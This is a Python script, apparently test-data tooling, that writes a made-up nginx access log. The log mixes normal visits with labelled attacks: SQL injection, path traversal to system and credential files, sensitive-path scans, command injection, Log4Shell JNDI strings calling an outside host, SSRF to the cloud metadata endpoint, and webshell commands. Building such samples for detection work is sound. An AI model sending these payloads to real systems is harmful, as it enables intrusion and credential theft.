"""Genera samples/access.log, un log de nginx inventado (formato combined) con tráfico
normal y varios ataques mezclados.

Las IPs son de los rangos reservados para documentación (RFC 5737), no son de nadie.
Uso: python samples/generate_web_sample.py
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote

OUT = Path(__file__).with_name("access.log")
UA_NORMAL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0",
]
NORMAL_PATHS = [
    "/",
    "/index.html",
    "/blog",
    "/blog/retro-consolas",
    "/css/style.css",
    "/js/app.js",
    "/img/logo.png",
    "/contacto",
    "/sobre-mi",
    "/favicon.ico",
    "/robots.txt",
]


class WebLog:
    def __init__(self, seed: int = 7) -> None:
        self.rng = random.Random(seed)
        self.lines: list[tuple[datetime, str]] = []

    def hit(self, when, ip, request, status, size=512, ua=None):
        # El cliente manda la URL codificada (espacio -> %20, ' -> %27) y nginx la guarda así.
        # El '+' se deja tal cual: en la query string significa espacio.
        method, _, rest = request.partition(" ")
        target, _, proto = rest.rpartition(" ")
        request = f"{method} {quote(target, safe='/?=&:._-+')} {proto}"
        ua = ua or self.rng.choice(UA_NORMAL)
        stamp = when.strftime("%d/%b/%Y:%H:%M:%S +0200")
        self.lines.append((when, f'{ip} - - [{stamp}] "{request}" {status} {size} "-" "{ua}"'))

    def write(self, path):
        self.lines.sort(key=lambda item: item[0])
        path.write_text("".join(line + "\n" for _, line in self.lines), encoding="utf-8")


def main() -> None:
    log = WebLog()
    rng = log.rng
    t0 = datetime(2026, 9, 25, 8, 0, 0)

    # Tráfico normal durante el día.
    for minute in range(0, 12 * 60, 3):
        when = t0 + timedelta(minutes=minute, seconds=rng.randint(0, 59))
        ip = f"198.51.100.{rng.randint(10, 60)}"
        path = rng.choice(NORMAL_PATHS)
        log.hit(when, ip, f"GET {path} HTTP/1.1", 200, rng.randint(200, 4000))

    # 1) Inyección SQL contra el buscador.
    t = t0 + timedelta(hours=1)
    sqli = [
        "/buscar?q=1' OR '1'='1",
        "/buscar?q=1 UNION SELECT username,password FROM users--",
        "/producto?id=5 AND SLEEP(5)",
        "/producto?id=5;SELECT * FROM information_schema.tables",
        "/login?user=admin'--",
    ]
    for payload in sqli:
        t += timedelta(seconds=rng.randint(3, 20))
        log.hit(t, "203.0.113.66", f"GET {payload} HTTP/1.1", 200, 900, ua="sqlmap/1.8")

    # 2) Path traversal buscando ficheros del sistema. El segundo va con doble codificación:
    #    "%2f" se vuelve a codificar como "%252f" para saltarse filtros que descodifican una vez.
    t = t0 + timedelta(hours=2, minutes=30)
    for payload in [
        "/download?file=../../../../etc/passwd",
        "/download?file=..%2f..%2f..%2fetc%2fshadow",
        "/view?p=/proc/self/environ",
        "/img?src=../../.env",
    ]:
        t += timedelta(seconds=rng.randint(2, 15))
        log.hit(t, "203.0.113.88", f"GET {payload} HTTP/1.1", 404, 0, ua="curl/8.5.0")

    # 3) Escaneo de rutas sensibles (busca paneles y ficheros de configuración).
    t = t0 + timedelta(hours=4)
    for path in [
        "/.env",
        "/.git/config",
        "/wp-login.php",
        "/wp-admin/",
        "/phpmyadmin/",
        "/administrator/",
        "/.aws/credentials",
        "/config.php.bak",
        "/backup.sql",
        "/.ssh/id_rsa",
        "/server-status",
    ]:
        t += timedelta(seconds=rng.randint(1, 8))
        log.hit(t, "192.0.2.150", f"GET {path} HTTP/1.1", 404, 0, ua="Mozilla/5.0 zgrab/0.x")

    # 4) Intento de ejecución de comandos (incluye Log4Shell).
    t = t0 + timedelta(hours=6, minutes=20)
    for payload in [
        "/api?cmd=;id",
        "/ping?host=127.0.0.1|cat /etc/passwd",
        "/search?q=${jndi:ldap://198.51.100.200/x}",
    ]:
        t += timedelta(seconds=rng.randint(2, 12))
        log.hit(t, "203.0.113.201", f"GET {payload} HTTP/1.1", 500, 0, ua="Java/1.8.0")

    # 5) Barrido de rutas (muchos 404 con nombres de plugins conocidos).
    t = t0 + timedelta(hours=8)
    for i in range(25):
        t += timedelta(seconds=rng.randint(1, 5))
        log.hit(t, "192.0.2.240", f"GET /plugins/mod_{i:02d}/index.php HTTP/1.1", 404, 0, ua="masscan/1.3")

    # 6) Inyección SQL escrita con '+' en vez de %20, que es como la mandan muchas herramientas.
    t = t0 + timedelta(hours=9)
    for payload in ["/producto?id=5+UNION+SELECT+1,2,3--", "/producto?id=5+AND+1=1+UNION+ALL+SELECT+NULL--"]:
        t += timedelta(seconds=rng.randint(5, 30))
        log.hit(t, "203.0.113.70", f"GET {payload} HTTP/1.1", 500, 0, ua="Mozilla/5.0")

    # 7) Log4Shell en el User-Agent: la URL es normal, el ataque va en la cabecera.
    t = t0 + timedelta(hours=10, minutes=15)
    log.hit(t, "203.0.113.140", "GET / HTTP/1.1", 200, 3586, ua="${jndi:ldap://198.51.100.200:1389/a}")

    # 8) Fuerza bruta contra el login de WordPress (responde 200 aunque la contraseña esté mal).
    t = t0 + timedelta(hours=10, minutes=40)
    for _ in range(30):
        t += timedelta(seconds=rng.randint(2, 6))
        log.hit(t, "203.0.113.155", "POST /wp-login.php HTTP/1.1", 200, 4100, ua="Mozilla/5.0")

    # 9) SSRF: intenta que el servidor le lea las credenciales de la nube.
    t = t0 + timedelta(hours=11)
    log.hit(t, "203.0.113.160", "GET /preview?url=http://169.254.169.254/latest/meta-data/iam/ HTTP/1.1", 200, 312)

    # 10) Una webshell que alguien subió antes y ahora usa (responde 200: existe).
    t = t0 + timedelta(hours=11, minutes=30)
    for cmd in ["whoami", "uname+-a", "cat+/etc/passwd"]:
        t += timedelta(seconds=rng.randint(5, 20))
        log.hit(t, "203.0.113.170", f"GET /wp-content/uploads/2026/09/thumb.php?cmd={cmd} HTTP/1.1", 200, 77)

    log.write(OUT)
    print(f"{OUT} generado con {len(log.lines)} líneas")


if __name__ == "__main__":
    main()
